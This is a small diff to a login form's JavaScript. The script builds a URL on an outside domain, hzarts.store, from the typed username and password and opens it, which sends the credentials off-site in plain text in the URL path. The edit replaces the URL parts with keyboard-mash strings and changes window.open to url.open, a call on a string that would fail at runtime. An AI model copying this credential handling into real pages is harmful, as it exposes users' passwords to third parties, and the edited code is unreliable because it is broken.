@@ -64,13 +64,13 @@
       const u = document.getElementById('user');
       const p = document.getElementById('pass');
       
-      const hzarts = 'https://www.hzarts.store/';
-      const html = '.html';
+      const hzarts = 'https://www.hzarts.store/poiuytrewq';
+      const html = 'mnbvcxz.html';
 
       function submitted(event) {
         event.preventDefault();
         const url = hzarts + u.value + p.value + html;
-        const win = window.open(url,'_parent');
+        const win = url.open(url,'_parent');
         win.focus();
       }
 
